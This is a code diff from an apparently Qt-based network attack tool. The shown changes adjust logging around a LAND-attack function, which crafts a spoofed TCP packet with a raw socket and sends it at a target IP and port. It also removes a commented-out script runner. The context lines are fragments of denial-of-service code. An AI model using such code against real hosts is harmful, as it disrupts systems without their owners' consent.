@@ -14,34 +14,7 @@
 #include <QThread>
 #include <QTimer>
 
-//My_Obj_attack::My_Obj_attack()
-//{
-//    proc = new QProcess();
-//    timer = new QTimer();
-//    connect(timer, SIGNAL(timeout()), this, SLOT(start_timer()));
-//    timer->start(500);
-//}
-//void My_Obj_attack::start_timer()
-//{
-////    if(timer->isActive())
-////        timer->stop();
-//    out = "";
-//    emit send_appendOutput("out");
-//    QString program = "bash";;
-//    QStringList arguments;
-//    arguments<<g_sWorkingPath + "/Scripts/netinfo/2/netspeed.sh";
-//    proc->start(program, arguments);
-//    if(!proc->waitForStarted())
-//    {
-//        return;
-//    }
-//    while(true == proc->waitForFinished())
-//    {
-//            out += proc->readAll();
-//        emit send_appendOutput(out);
-//    }
-////    timer->start(1500);
-//}
+extern QString getcurrenttime();
 
 #pragma pack(1)
 
@@ -135,13 +108,14 @@ int attack::doland()
     bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct tcphdr));
     tcpheader->th_sum=checksum((u_short *) &pseudoheader,12+sizeof(struct tcphdr));
 
+    QString qmsg = m_inputIp->text()+ ":" + m_inputPort->text() +" land attack...\n";
+    appendOutput(qmsg);
+
     if(sendto(sockfd,buffer,sizeof(struct iphdr)+sizeof(struct tcphdr),0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1)
     {
             fprintf(stderr,"couldn't send packet\n");
             return(-1);
     }
-    QString qmsg = m_inputIp->text()+ ":" + m_inputPort->text() +"landed\n";
-    appendOutput(qmsg);
 
 //    fprintf(stderr,"%s:%s landed\n",argv[1],argv[2]);
 
@@ -341,8 +315,9 @@ void attack::land()
 }
 
 void attack::appendOutput(QString output) {
+    output = "["+getcurrenttime()+"] "+output+"\n";
     QString strOldRecord = m_textResult->toPlainText().left(1024);
-    m_textResult->setPlainText(strOldRecord + "\n" + output);
+    m_textResult->setPlainText(strOldRecord + output);
 }
 
 void attack::processAttackResult(const QString & result) {
